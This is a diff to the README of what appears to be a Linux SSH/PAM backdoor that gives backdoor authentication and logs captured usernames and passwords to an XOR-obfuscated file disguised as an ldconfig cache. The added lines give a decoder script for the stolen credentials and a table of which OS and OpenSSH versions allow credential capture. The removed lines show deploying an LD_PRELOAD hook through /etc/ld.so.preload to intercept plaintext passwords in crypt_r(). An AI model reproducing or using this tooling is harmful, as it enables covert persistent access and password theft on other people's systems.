@@ -87,12 +87,15 @@ docker exec photon-test tdnf install -y openssh shadow sed
 Location: `/var/cache/ldconfig/aux-cache.log`
 
 Decode:
+```bash
+./creds.sh /var/cache/ldconfig/aux-cache.log
+```
+
+Or manually:
 ```python
 key = b'ld.so.cache'
-with open('aux-cache.log', 'rb') as f:
-    data = f.read()
-out = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
-print(out.decode())
+d = open('/var/cache/ldconfig/aux-cache.log', 'rb').read()
+print(bytes([d[i] ^ key[i % len(key)] for i in range(len(d))]).decode())
 ```
 
 Output format: `timestamp|username|password`
@@ -112,32 +115,15 @@ rm /var/cache/ldconfig/aux-cache.log
 
 ## Compatibility
 
-| OS | PAM Path | Auth | Cred Log |
-|----|----------|------|----------|
-| Photon OS 1.0 | `/usr/lib/security/` | Yes | Yes (PAM) |
-| Debian 12 | `/lib/x86_64-linux-gnu/security/` | Yes | Yes (Hook)* |
-| RHEL/CentOS | `/lib64/security/` | - | - |
-| Generic Linux | `/lib/security/` | - | - |
+| OS | OpenSSH | Auth | Cred Log |
+|----|---------|------|----------|
+| Photon OS 1.0 | 7.4 | Yes | Yes |
+| Debian 11 | 8.4 | Yes | Yes |
+| Debian 12 | 9.2 | Yes | No* |
+| RHEL/CentOS 7 | 7.4 | Yes | Yes |
+| RHEL/CentOS 8+ | 8.0+ | Yes | Partial* |
 
-*OpenSSH 9.x scrubs passwords before returning them to PAM modules. Use `pam_hook.so` (LD_PRELOAD) for credential capture.
-
-## OpenSSH 9.x Workaround
-
-For systems with OpenSSH 9.x, use the LD_PRELOAD hook instead of the PAM module for credential capture:
-
-```bash
-# Compile
-gcc -fPIC -shared -o pam_hook.so pam_hook.c -ldl
-
-# Deploy (system-wide)
-cp pam_hook.so /lib/
-echo "/lib/pam_hook.so" > /etc/ld.so.preload
-
-# Or per-process
-LD_PRELOAD=/path/to/pam_hook.so /usr/sbin/sshd -D
-```
-
-The hook intercepts `crypt_r()` where the plaintext password is verified, bypassing OpenSSH's PAM scrubbing.
+*OpenSSH 9.x scrubs passwords before PAM modules receive them. Credential capture is not reliable on these versions. Backdoor authentication works on all versions.
 
 ## Legal
 
